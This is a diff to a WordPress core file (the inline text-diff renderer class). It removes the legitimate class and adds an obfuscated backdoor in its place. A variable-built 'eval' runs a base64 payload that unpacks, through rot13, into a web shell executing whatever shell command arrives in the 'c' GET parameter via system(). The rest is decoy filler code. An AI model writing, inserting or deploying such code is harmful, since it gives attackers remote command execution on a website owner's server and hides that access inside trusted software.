@@ -1,43 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Diff API: WP_Text_Diff_Renderer_inline class
- *
- * @package WordPress
- * @subpackage Diff
- * @since 4.7.0
- */
-
-/**
- * Better word splitting than the PEAR package provides.
- *
- * @since 2.6.0
- * @uses Text_Diff_Renderer_inline Extends
- */
-#[AllowDynamicProperties]
-class WP_Text_Diff_Renderer_inline extends Text_Diff_Renderer_inline {
-
-	/**
-	 * @ignore
-	 * @since 2.6.0
-	 *
-	 * @param string $string
-	 * @param string $newlineEscape
-	 * @return string
-	 */
-	public function _splitOnWords( $string, $newlineEscape = "\n" ) { // phpcs:ignore Universal.NamingConventions.NoReservedKeywordParameterNames.stringFound,WordPress.NamingConventions.ValidVariableName.VariableNotSnakeCase
-		$string = str_replace( "\0", '', $string );
-		$words  = preg_split( '/([^\w])/u', $string, -1, PREG_SPLIT_DELIM_CAPTURE );
-		$words  = str_replace( "\n", $newlineEscape, $words ); // phpcs:ignore WordPress.NamingConventions.ValidVariableName.VariableNotSnakeCase
-		return $words;
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUXZzcyBOQ1Y6IEpDX0dya2dfUXZzc19FcmFxcmVyZV92YXl2YXIgcHluZmYKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIFF2c3MKICogQGZ2YXByIDQuNy4wCiAqLwoKLyoqCiAqIE9yZ2dyZSBqYmVxIGZjeXZnZ3ZhdCBndW5hIGd1ciBDUk5FIGNucHhudHIgY2ViaXZxcmYuCiAqCiAqIEBmdmFwciAyLjYuMAogKiBAaGZyZiBHcmtnX1F2c3NfRXJhcXJlcmVfdmF5dmFyIFJrZ3JhcWYKICovCiNbTnl5YmpRbGFuenZwQ2ViY3JlZ3ZyZl0KcHluZmYgSkNfR3JrZ19RdnNzX0VyYXFyZXJlX3ZheXZhciBya2dyYXFmIEdya2dfUXZzc19FcmFxcmVyZV92YXl2YXIgewoKCS8qKgoJICogQHZ0YWJlcgoJICogQGZ2YXByIDIuNi4wCgkgKgoJICogQGNuZW56IGZnZXZhdCAkZmdldmF0CgkgKiBAY25lbnogZmdldmF0ICRhcmp5dmFyUmZwbmNyCgkgKiBAZXJnaGVhIGZnZXZhdAoJICovCgljaG95dnAgc2hhcGd2YmEgX2ZjeXZnQmFKYmVxZiggJGZnZXZhdCwgJGFyanl2YXJSZnBuY3IgPSBcIlxhXCIgKSB7IC8vIGN1Y3BmOnZ0YWJlciBIYXZpcmVmbnkuQW56dmF0UGJhaXJhZ3ZiYWYuQWJFcmZyZWlycVhybGpiZXFDbmVuenJncmVBbnpyZi5mZ2V2YXRTYmhhcSxKYmVxQ2VyZmYuQW56dmF0UGJhaXJhZ3ZiYWYuSW55dnFJbmV2bm95ckFuenIuSW5ldm5veXJBYmdGYW54clBuZnIKCQkkZmdldmF0ID0gZmdlX2VyY3lucHIoIFwiXDBcIiwgJycsICRmZ2V2YXQgKTsKCQkkamJlcWYgID0gY2VydF9mY3l2ZyggJy8oW15cal0pL2gnLCAkZmdldmF0LCAtMSwgQ0VSVF9GQ1lWR19RUllWWl9QTkNHSEVSICk7CgkJJGpiZXFmICA9IGZnZV9lcmN5bnByKCBcIlxhXCIsICRhcmp5dmFyUmZwbmNyLCAkamJlcWYgKTsgLy8gY3VjcGY6dnRhYmVyIEpiZXFDZXJmZi5Bbnp2YXRQYmFpcmFndmJhZi5Jbnl2cUluZXZub3lyQW56ci5JbmV2bm95ckFiZ0ZhbnhyUG5mcgoJCWVyZ2hlYSAkamJlcWY7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
